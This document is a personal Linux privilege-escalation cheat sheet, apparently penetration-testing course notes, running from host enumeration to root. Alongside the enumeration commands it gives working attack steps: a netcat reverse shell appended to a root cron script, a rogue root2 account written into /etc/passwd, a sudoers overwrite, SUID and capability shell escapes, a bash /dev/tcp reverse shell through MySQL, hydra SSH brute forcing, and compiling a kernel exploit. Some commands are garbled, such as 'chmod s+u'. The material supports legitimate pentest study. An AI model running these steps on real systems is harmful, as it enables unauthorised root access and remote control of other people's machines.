# Linux Privilege Escalation

### Understanding your Machine

```bash
id
cat /etc/passwd
hostname
# if not connected to another interface, the machine cannot be used as a pivot point
ifconfig # or ip a
cat /etc/issue
cat /etc/os-release
uname -a
```

#### Looking at Root Processes & Clear-Text Passwords

```bash
ps aux | grep root --color=auto
ps -ef --forest | grep root --color=auto
ps aux | grep pass --color=auto
ps -ef --forest | grep pass --color=auto
```

### Available Network Interfaces, Routes, and Open Ports

The next step in our analysis of the target host is to review available network interfaces, routes, and open ports. This information can help us determine if the compromised target is connected to multiple networks and therefore could be used as a pivot. The presence of specific virtual interfaces may also indicate the existence of virtualization or antivirus software.

We can also investigate port bindings to see if a running service is only available on a loopback address, rather than on a routable one. Investigating a privileged program or service listening on the loopback interface could expand our attack surface and increase our probability of a privilege escalation attack's success.

An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly reachable from the original attack machine.

```bash
ip neigh # arp table
ip route
routel # Display network routing tables
route
```

You can display active network connections and listening ports using either netstat or ss, both of which accept the same arguments.
 
```bash
ss -anp
ss -lntp
netstat -anp
sudo netstat -ltnp
```

If a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system.

During this phase, we can also gather information about inbound and outbound port filtering to facilitate port forwarding and tunneling when it's time to pivot to an internal network.

Debian Linux saves firewall rules in specific files under /etc/iptables by default. These files are used by the system to restore netfilter rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.

We can also search for files created by the iptables-save command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the iptables-restore command and used to restore the firewall rules at boot time. If a system administrator had ever run this command, we could search the configuration directory (/etc) or grep the file system for iptables commands to locate the file. If the file has insecure permissions, we could use the contents to infer the firewall configuration rules running on the system.

```bash
cat /etc/iptables/rules.v4
```

### Scheduled Tasks

If you see any instance where a script or a cronjob does not specify the full path of a binary, whether it be Windows or Linux, the first thing that should come to mind is path injection. 

Systems acting as servers often periodically execute various automated, scheduled tasks. When these systems are misconfigured, or the user-created files are left with insecure permissions, we can modify these files that will be executed by the scheduling system at a high privilege level.

Scheduled tasks are listed under the /etc/cron.* directories, where * represents the frequency at which the task will run. For example, tasks that will be run daily can be found under /etc/cron.daily. Each script is listed in its own subdirectory.

```bash
ll /etc/cron*
```

To view the current user's scheduled jobs, we can run crontab followed by the -l parameter. If we try to run the same command with the sudo prefix, you can discover that a backup scripts can be scheduled that you wouldn't otherwise see. In other words, listing cron jobs using sudo reveals jobs run by the root user.

```bash
crontab -l
sudo crontab -l
```

You can also inspect the cron log file for running cron jobs:

```bash
grep "CRON" /var/log/syslog
```

### Locating Exploits

At some point, we may need to leverage an exploit to escalate our local privileges. If so, our search for a working exploit begins with the enumeration of all installed applications, noting the version of each. We can use this information to search for a matching exploit.

Linux-based systems use a variety of package managers. For example, Debian-based Linux distributions, like the one in our lab, use dpkg, while Red Hat-based systems use rpm. To list applications installed by dpkg on our Debian system, we can use dpkg -l.

```bash
dpkg -l
```

Files with insufficient access restrictions can create a vulnerability that may grant an attacker elevated privileges. This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account. Sensitive files that are readable by an unprivileged user may also contain important information such as hard-coded credentials for a database or a service account running with higher privileges.

Search for every directory writable by the current user on the target system. We'll search the whole root directory (/) and use the -writable argument to specify the attribute we are interested in. We can also use -type d to locate directories, and filter errors with 2>/dev/null:

```bash
# World writable notes
find / -writable -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

# Find writable files and directories
find / -type d -writable -user $(whoami) 2>/dev/null
find / -type d -writable -group groupname 2>/dev/null

find / -type f -writable -user $(whoami) 2>/dev/null
find / -type f -writable -group groupname 2>/dev/null
```

Look for the link between crons, their paths, and whether you can write to their path. If you can, it's game over. 

### Don't Forget to Check for Path Injection


### Mounts and Drivers

On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.

Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it's good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.

```bash
cat /etc/fstab # lists all drive that will be mounted at boot time
mount # list all mounted drives
lsblk # view all available disks
```
In some situations, showing information for all local disks on the system might reveal partitions that are not mounted. Depending on the system configuration (or misconfiguration), we then might be able to mount those partitions and search for interesting documents, credentials, or other information that could allow us to escalate our privileges or get a better foothold in the network.

Another common privilege escalation technique involves exploitation of device drivers and kernel modules. Since this technique relies on matching vulnerabilities with corresponding exploits, we'll need to gather a list of drivers and kernel modules that are loaded on the target. We can enumerate the loaded kernel modules using lsmod without any additional arguments.

```bash
lsmod
/sbin/modinfo libata # to find out more about the specific modules in lsmod
```

### SUIDs and GUIDs

Aside from the rwx file permissions described previously, two additional special rights pertain to executable files: setuid and setgid. These are symbolized with the letter "s".

If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid).

When running an executable, it normally inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.

When a user or a system-automated script launches a SUID application, it inherits the UID/GID of its initiating script: this is known as effective UID/GID (eUID, eGID), which is the actual user that the OS verifies to grant permissions for a given action.

Any user who manages to subvert a setuid root program to call a command of their choice can effectively impersonate the root user and gains all rights on the system. Penetration testers regularly search for these types of files when they gain access to a system as a way of escalating their privileges.

```bash
find / -perm -u=s -type f 2>/dev/null
ll $(find / -perm -u=s -type f 2>/dev/null )
find / -perm -g=s -type f 2>/dev/null
ll $(find / -perm -g=s -type f 2>/dev/null )
ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2>/dev/null ) # combined
```

In this case, the command found several SUID binaries. Exploitation of SUID binaries will vary based on several factors. For example, if /bin/cp (the copy command) were SUID, we could copy and overwrite sensitive files such as /etc/passwd.

Here's a great resource to [reference] (https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

### Automating Enumeration

To get an initial baseline of the target system, we can use unix-privesc-check1 on UNIX derivatives such as Linux. It performs a number of checks to find any system misconfigurations that can be abused for local privilege escalation.

```bash
./unix-privesc-check standard > output_std.txt
./unix-privesc-check detailed > output_dtd.txt
```

LinEnum and LinPeas are two great alternatives.

### Inspecting User Trails

As penetration testers, we are often time-constrained during our engagements. For this reason, we should focus our efforts first on low-hanging fruit. One such target is users' history files. These files often hold clear-text user activity that might include sensitive information such as passwords or other authentication material. Sometimes system administrators store credentials inside environment variables as a way to interact with custom scripts that require authentication.

```bash
env
```

To log into another user or root:

```bash
su - root
su - www-data
```

Instead of aiming directly for the root account, we could try gaining access to the eve user we discovered during a previous section. With our knowledge of script credentials, we could try building a custom dictionary derived from the known password to attempt brute forcing eve's account. 

We can do this by using the crunch command line tool to generate a custom wordlist. We'll set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first three characters to Lab followed by three numeric digits.

```bash
crunch 6 6 -t Lab%%% > wordlist
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```

Whenever you gain access to a user, new or not, run:

```bash
sudo -l # view if your user has any sudo permissions
sudo -i # if you can run this, you'll be root
echo “user ALL=(root) NOPASSWD: ALL” > /etc/sudoers # another reliable way to get sudo
```

### Inspecting Service Footprints

System daemons are Linux services that are spawned at boot time to perform specific operations without any need for user interaction. Linux servers are often configured to host numerous daemons, like SSH, web servers, and databases, to mention a few.

We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".

```bash
watch -n 1 "ps -aux | grep root --color=auto"
```

Another more holistic angle we should take into consideration when enumerating for privilege escalation is to verify whether we have rights to capture network traffic.

***tcpdump*** is the de facto command line standard for packet capture, and it requires administrative access since it operates on raw sockets. However, it's not uncommon to find IT personnel accounts have been given exclusive access to this tool for troubleshooting purposes.

```bash
sudo tcpdump -i lo -A | grep "pass"
```

### Abusing Cron Jobs

In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access, but also runs at an elevated privilege level. On a Linux system, the cron time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

One way to abuse a cronjob is to insert a reverse one-liner:

```bash
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_eaiuebackups.sh
```

```bash
nc -lvnp 1234
```

Another way is to set a SUID for dash:

```bash
echo >> user_backups.sh
echo >> "chmod s+u /bin/dash"
..
/bin/dash -p
```

### Abusing Password Authentication

Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. *This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.*

To escalate our privileges, let's add another superuser (root2) and the corresponding password hash to /etc/passwd. We will first generate the password hash using the openssl tool and the passwd argument. By default, if no other option is specified, openssl will generate a hash using the crypt algorithm, a supported hashing mechanism for Linux authentication.

The output of the OpenSSL passwd command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.

```bash
ls -lsah /etc/passwd
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
id # Verify it worked
```

### Abusing Setuid Binaries and Capabilities

When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID. As previously discussed, user passwords are stored as hashes within /etc/shadow, which is owned and writable only by root (uid=0). How, then, can non-privileged users access this file to change their own password? To circumvent this issue, the effective UID/GID was introduced, which represents the actual value being checked when performing sensitive operations.

As a practical example, once we've completed manual or automated enumeration, we'll have discovered that the find utility is misconfigured and has the SUID flag set.

We can quickly abuse this vulnerability by running the find program to search any well-known file, like our own Desktop folder. Once the file is found, we can instruct find to perform any action through the -exec parameter. In this case, we want to execute a bash shell along with the Set Builtin -p parameter that is preventing the effective user from being reset.

```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
id # Verify it worked
```

Another set of features subject to privilege escalation techniques are *Linux capabilities*.

Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.

To demonstrate these risks, let's try to manually enumerate our target system for binaries with capabilities. We are going to run getcap with the -r parameter to perform a recursive search starting from the root folder /, filtering out any errors from the terminal output.

```bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = **cap_setuid+ep**
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted. Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format.

In order to exploit this capability misconfiguration, we could check the GTFOBins website. This site provides an organized list of UNIX binaries and how can they be misused to elevate our privileges.

Searching for "Perl" on the GTFOBins website, we'll find precise instructions for which command to use to exploit capabilities. We'll use the whole command, which executes a shell along with a few POSIX directives enabling setuid.

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Abusing Sudo

You can think of sudo as changing the effective user-id of the executed command. Custom configurations of sudo-related permissions can be applied in the /etc/sudoers file. 

Let's say that you're doing a GTFObins escalation, and you get hit with a "failed: Permission Denied", what should you do? Check the logs.

```bash
cat /var/log/syslog | grep tcpdump # or whatever command you were trying to abuse
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```

The logs show that the audit daemon logged the privesc attempt, and it shows that AppArmor was what triggered and blocked us. AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10. We can verify AppArmor's status as the root user using the aa-status command.

```bash
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
```

This confirms that tcpdump is actively protected with a dedicated AppArmor profile.

### Exploiting Kernel Vulnerabilities

Kernel exploits are an excellent way to escalate privileges, but our success may depend on matching not only the target's kernel version, but also the operating system flavor, such as Debian, RHEL, Gentoo, etc.

To demonstrate this attack vector, we will first gather information about our Ubuntu target by inspecting the /etc/issue file. As discussed earlier in the Module, this is a system text file that contains a message or system identification to be printed before the login prompt on Linux machines. We should also inspect the kernel version and system architecture using standard system commands:

```bash
cat /etc/issue
uname -r
arch
```

Let's use searchsploit to and use "linux kernel Ubuntu 16 Local Privilege Escalation" as our main keywords. We also want to filter out some clutter from the output, so we'll exclude anything below kernel version 4.4.0 and anything that matches kernel version 4.8.

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

We'll use gcc on Linux to compile our exploit, keeping in mind that when compiling code, we must match the architecture of our target. This is especially important in situations where the target machine does not have a compiler and we are forced to compile the exploit on our attacking machine or in a sandboxed environment that replicates the target OS and architecture.

```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
scp cve-2017-16995.c joe@192.168.123.216:
```

```bash
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
./cve-2017-16995
```

#### Brute Forcing SSH

```bash
hydra -l offsec -P wordlist -s 2222 ssh://192.168.12.133
```

#### Payload of All Things

Has some amazing enumeration and priv esc commands, 'https://github.com/swisskyrepo/PayloadsAllTheThings'.

#### Check Your ID Group

See if you're in any interesting groups.. this will be a big sign. In this case, I'm in the disk group, which has it's own public privesc vector.

#### /var/spool/mail

Don't forget to check your mail!! 

```bash
ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

#### Found SSH Keys 

If you find random ssh keys in the environment, you can test them against the users on the box on the loopback:

```bash
chmod 600 random_key
ssh -i random_key root@127.0.0.1
```

#### Credentials in /var/www/html/

If you're stuck, it's a good idea to check the loopback for vulns and to explore the /var/www/html or wherever the website is being hosted. There are often credentials and information that will guide you.

#### Logs

Check the auth.log, access.log, error.log.

#### SUID Weird Persistance

Doesn't say that you're root, but you behave as root. Run 'bash -p -i'.

```bash
www-data@image:/var/www/html$ strace -o /dev/null /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# bash -p -i
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

#### Start-Stop-Daemon

```bash
/usr/sbin/start-stop-daemon
/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
```

#### NFS

```bash
cat /etc/exports
```

#### MySQL Privesc

If MySQL is running as root and you can login, you can elevate privs by writing files such as a revshell and executing them. Also search for privescs for the specific version that is running, "mysql --version".

```bash
select do_system('/bin/bash /tmp/bash.sh');

#!/bin/bash
# bash.sh file
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 
```

Resource: https://www.exploit-db.com/exploits/1518

#### Manual Investigation

Say that you get on a box, and you look at the ports and find multiple things running on the localhost, you want to figure out what these are. If the website is running apache, go into '/etc/apache2/sites-enabled' and read the .conf files to see what's going on.. whether there is a website that you don't know of. See if MySQL is being used for the website, or if it's something else that's worth looking into.

Check all of the .git config files, run git log.

```bash
find / -type d -name ".git" 2>/dev/null
```

If you have access to any source code that you can run as admin or another user, check whether the full path is always specified. If not, you can run it out of a directory that you have write access to and go crazy.

Make sure that you investigate the logs folder whenever you run into a .git. Of course, also run git show and git log (redundant).